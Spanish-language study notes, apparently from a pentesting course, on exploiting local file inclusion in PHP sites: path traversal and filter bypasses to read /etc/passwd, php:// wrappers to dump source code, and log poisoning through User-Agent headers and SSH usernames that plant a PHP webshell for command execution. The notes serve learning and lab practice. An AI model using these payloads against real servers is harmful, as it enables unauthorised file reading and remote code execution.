# LFI

Inclusion de un archivo local en una web

también es posible que este "sanitizado" poniendo que la ruta donde se va a llamar va a ser /var/www/html/ por ejemplo, y por ejemplo se llama desde la url a /etc/passwd, este no existiría debido a que no existe la ruta /var/www/html//etc/passwd.

aqui es donde entra el ==path traversal== debido a que si existiría la ruta ==../../../../../../../../var/www/html/etc/passwd== o lo que corresponda

de la misma manera si esta sanitizado el hecho de poner ../../../ podríamos burlar esa sanitización simplemente añadiendo lo siguiente ==....//....//....//....//....//etc/passwd==

es importante de tener en cuenta que jugar con el uso de preg\_match no es la mejor idea debido a que por ejemplo se muestra el mismo contenido para cat /etc/passwd que para ==/etc////////passwd==. Lo mismo para ==/etc/././././passwd==

tambien es importante destacar que si tu haces ==cat /etc/hos?t== el sistema tambien devolverá la salida correcta porque busca en ese interrogante o ==cat /e??/hos??ts== siempre que no pueda encontrar otro archivo con esas carácteristicas en los interrogantes

en el caso de tener una versión de ==php desactualizada (5.3.x)== y en el servidor se contemple el uso obligatorio de la extensión php, podriamos jugar con un NULL byte ==%00== que realmente se traduce en ==\0==

en el caso de que se controle del lado del servidor que la ultimas cadenas sean por ejemplo passwd y que si es passwd no te lo muestre, (se puede hacer mediante substring(argv\[1], -6,6)!="passwd")) entonces con versiones anteriores de php simplemente haciendo cat /etc/passwd/. esto de nuevo mostraría el contenido de el archivo que estamos queríendo visualizar

https://github.com/NetsecExplained/docker-labs

Resolviendo esta maquina se explica que primero se ve que ?page=course o ?page=home. posteriormente ve si course.php existe en la maquina y parece que si, por lo tanto la búsqueda lo que está haciendo es añadirle la extensión .php

en el caso de que quieras obtener el codigo completo de un recurso por ejemplo php que esta siendo utilizado, se podrí llegar a hacer si se permite el uso de wrappers, en el caso de que podamos hacer por ejemplo

```
http://<ip>?filename=php://filter/convert.base64-encode/resource=secret.php
```

de esta manera tendriamos el código que se supone que debería estar interpretado por el uso de php completamente entero para nosotros. también se puede hacer esto, la misma idea es hacer

```
http://<ip>?filename=php://filter/read=string.rot13/resource=secret.php
```

de esta manera php tampoco interpretará el contenido del archivo php por que las letras están siendo pasadas 13 posiciones de su posicion

!\[\[Pasted image 20251007124431.png]]

tambien se podria hacer

```
http://<ip>?filename=php://filter/convert.iconv.utf-8.utf-16/resource=secret.php
```

de esta manera tampoco se verá el archivo correspondiente

Derivar a un RCE:

!\[\[Pasted image 20251007124921.png]]

cambia la solicitud a post y el wrapped a php://input y manda como post y como vemos la respuesta del servidor lo interpreta como www-data

tambien se podria hacer por get con el siguiente wrapped:

!\[\[Pasted image 20251007125149.png]]

php encoding filter generator para poder inyectar comandos en una url https://github.com/synacktiv/php\_filter\_chain\_generator

!\[\[Pasted image 20251007131941.png]]

de esta manera introduce Hola en una linea, como tambien se podria incluir y conseguir RCE

## LOG POISONING

Si haces id y perteneces al grupo adm, normalmente adm son los que tienen capacidad de leer logs del sistema

```
/var/log/apache2/access.log
```

mediante una peticion curl, si tenemos acceso a este log, y como cabecera indicamos

```
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php  system('whoami'); ?>"
```

si tu en vez de esto haces que el user-agent valga

```
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php  system(\$_GET['cmd']); ?>"
```

ya tendriamos ejecución de comandos mediante el comando &?cmd= en la url

en el caso de contaminar los logs de apache

los logs de ssh suelen estar en /var/log/auth.log

o tambien puede estar en /var/log/btmp, depende de la versión del sistema

```
 ssh '<?php system($_GET["cmd"]; ?>)'@<ip>
```

si tenemos capacidad de lectura en el archivo de logs, nos interpretara la web el php correspondiente y tendremos RCE
